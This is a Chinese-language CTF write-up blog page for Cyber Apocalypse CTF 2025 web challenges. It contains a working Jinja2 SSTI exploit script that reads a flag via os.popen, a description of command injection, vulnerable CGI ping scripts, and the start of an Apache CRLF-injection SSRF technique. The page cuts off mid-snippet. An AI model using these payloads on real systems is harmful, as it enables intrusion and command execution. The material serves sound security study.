@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cyber Apocalypse CTF 2025 部分web wp - Delete&#39;s blog</title><meta name="Description" content="A CTFer find something funny"><meta property="og:url" content="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/">
+  <meta property="og:site_name" content="Delete&#39;s blog">
+  <meta property="og:title" content="Cyber Apocalypse CTF 2025 部分web wp">
+  <meta property="og:description" content="A CTFer find something funny">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-28T00:18:17+08:00">
+    <meta property="article:modified_time" content="2025-03-28T00:18:17+08:00">
+    <meta property="article:tag" content="WP">
+    <meta property="article:tag" content="SSTI">
+    <meta property="article:tag" content="SSRF">
+    <meta property="article:tag" content="Apache">
+    <meta property="article:tag" content="Ruby">
+    <meta property="og:image" content="http://localhost:1313/images/1.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/1.jpg">
+  <meta name="twitter:title" content="Cyber Apocalypse CTF 2025 部分web wp">
+  <meta name="twitter:description" content="A CTFer find something funny">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/cyber-apocalypse-ctf-2025-web/" /><link rel="prev" href="http://localhost:1313/posts/pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" /><link rel="next" href="http://localhost:1313/posts/n1junior2025/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cyber Apocalypse CTF 2025 部分web wp",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/cyber-apocalypse-ctf-2025-web\/"
+        },"genre": "posts","keywords": "WP, SSTI, SSRF, Apache, Ruby","wordcount":  720 ,
+        "url": "http:\/\/localhost:1313\/posts\/cyber-apocalypse-ctf-2025-web\/","datePublished": "2025-03-28T00:18:17+08:00","dateModified": "2025-03-28T00:18:17+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog">Delete&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class="fas fa-list"></i> Posts </a><a class="menu-item" href="/categories/"><i class="fas fa-folder"></i> Categories </a><a class="menu-item" href="/about/"><i class="fas fa-user"></i> About </a><a class="menu-item" href="/friends/"><i class="fas fa-link"></i> Friends </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog">Delete&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class="fas fa-list"></i>Posts</a><a class="menu-item" href="/categories/" title=""><i class="fas fa-folder"></i>Categories</a><a class="menu-item" href="/about/" title=""><i class="fas fa-user"></i>About</a><a class="menu-item" href="/friends/" title=""><i class="fas fa-link"></i>Friends</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><a class="page-back" href="/posts/" data-page-back>
+    <i class="fas fa-chevron-left" aria-hidden="true"></i>
+    <span>Back</span>
+</a>
+<h1 class="single-title" style="view-transition-name: post-title-f560fa37aae05b56d692b0fbb0b46060;">Cyber Apocalypse CTF 2025 部分web wp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Delete</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf-writeups/"><i class="far fa-folder" aria-hidden="true"></i>CTF Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-28">2025-03-28</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;720 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static" data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#trial-by-fire">Trial by Fire</a></li>
+    <li><a href="#whispers-of-the-moonbeam">Whispers of the Moonbeam</a>
+      <ul>
+        <li><a href="#非预期">非预期</a></li>
+        <li><a href="#预期解">预期解</a></li>
+      </ul>
+    </li>
+    <li><a href="#cyber-attack">Cyber Attack</a></li>
+    <li><a href="#eldoria-realms">Eldoria Realms</a>
+      <ul>
+        <li><a href="#污染our_url">污染our_url</a></li>
+        <li><a href="#利用ssrf请求走私grpc-packet">利用SSRF请求走私GRPC packet</a></li>
+        <li><a href="#go命令注入">go命令注入</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>总的来说前面的题太简单了，后面的有点挑战性</p>
+<h2 id="trial-by-fire">Trial by Fire</h2>
+<p>进入是这个页面
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/01.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/01.png, /img/Cyber-Apocalypse-CTF-2025-WEB/01.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/01.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/01.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/01.png" />
+附件中看到这个路由</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/battle-report&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">battle_report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stats</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;damage_dealt&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;damage_dealt&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;turns_survived&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;turns_survived&#39;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span> <span class="o">.</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">REPORT_TEMPLATE</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        . . .
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;p class=&#34;title&#34;&gt;Battle Statistics&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;p&gt;🗡️ Damage Dealt: &lt;span class=&#34;nes-text is-success&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;damage_dealt&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        . . .
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;p&gt;⏱️ Turns Survived: &lt;span class=&#34;nes-text is-primary&#34;&gt;</span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;turns_survived&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/span&gt;&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        . . .
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">REPORT_TEMPLATE</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>很简单，只是一个jinja2的ssti
+exp:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:1337&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{{ url_for.__globals__.sys.modules.os.popen(&#39;cat flag.txt&#39;).read() }}&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/battle-report&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;damage_dealt&#34;</span><span class="p">:</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1"># &lt;p&gt;🗡️ Damage Dealt: &lt;span class=&#34;nes-text is-success&#34;&gt;49&lt;/span&gt;&lt;/p&gt;</span></span></span></code></pre></div></div>
+<h2 id="whispers-of-the-moonbeam">Whispers of the Moonbeam</h2>
+<p>进来后是类似于终端的东西
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/02.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/02.png, /img/Cyber-Apocalypse-CTF-2025-WEB/02.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/02.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/02.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/02.png" />
+拥有这些命令
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/03.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/03.png, /img/Cyber-Apocalypse-CTF-2025-WEB/03.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/03.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/03.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/03.png" /></p>
+<h3 id="非预期">非预期</h3>
+<p>利用的gossip命令
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/04.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/04.png, /img/Cyber-Apocalypse-CTF-2025-WEB/04.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/04.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/04.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/04.png" />
+看到目录下有flag.txt，直接访问
+看到目录下有flag.txt，直接访问<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/05.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/05.png, /img/Cyber-Apocalypse-CTF-2025-WEB/05.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/05.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/05.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/05.png" /></p>
+<h3 id="预期解">预期解</h3>
+<p>observe可以看到进程其实也就相当于执行了linux命令，command框下也提示<code>; for command injection</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/06.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/06.png, /img/Cyber-Apocalypse-CTF-2025-WEB/06.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/06.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/06.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/06.png" />
+所以直接
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/07.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/07.png, /img/Cyber-Apocalypse-CTF-2025-WEB/07.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/07.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/07.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/07.png" />
+一样的效果</p>
+<h2 id="cyber-attack">Cyber Attack</h2>
+<p>这个题目挺好玩的，是个关于Apache的洞，后续我会写一个专题专门写他
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/08.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/08.png, /img/Cyber-Apocalypse-CTF-2025-WEB/08.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/08.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/08.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/08.png" />
+进来是两个attack按钮。
+attack-domain.py</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cgi</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_domain</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)\.[a-zA-Z]{2,63}$&#39;</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="o">.</span><span class="n">FieldStorage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">getvalue</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">getvalue</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">name</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">is_domain</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1"># Increase this for an actual attack</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ping -c </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Location: ../?result=Succesfully attacked </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Location: ../?error=Hey </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">, watch it!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>attack.ip</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cgi</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ipaddress</span> <span class="kn">import</span> <span class="n">ip_address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="o">.</span><span class="n">FieldStorage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">getvalue</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">getvalue</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">name</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1"># Increase this for an actual attack</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ping -c </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">ip_address</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Location: ../?result=Succesfully attacked </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Location: ../?error=Hey </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">, watch it!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>可以看到在attack-domain中正则了一个域名，然后在attack-ip中则需要用ip_address来check ip形式，然后注意一下题目中给的apache配置</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ServerName</span> <span class="n">CyberAttack</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">AddType</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">httpd</span><span class="o">-</span><span class="n">php</span> <span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">Location</span> <span class="s2">&#34;/cgi-bin/attack-ip&#34;</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Order</span> <span class="n">deny</span><span class="p">,</span><span class="n">allow</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Deny</span> <span class="kn">from</span> <span class="nn">all</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Allow</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Allow</span> <span class="kn">from</span> <span class="p">::</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">Location</span><span class="o">&gt;</span></span></span></code></pre></div></div>
+<p>也就是只有本地用户才可以去调用attack-ip这个路由，并且在index.php中也做了限制
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/09.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/09.png, /img/Cyber-Apocalypse-CTF-2025-WEB/09.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/09.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/09.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/09.png" />
+然后这里要用到一个apache的一个CRLF injection来完成ssrf攻击
+像这样子</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">handler</span> <span class="o">=</span> <span class="s1">&#39;server-status&#39;</span>
+</span></span><span class="line"><span class="cl">
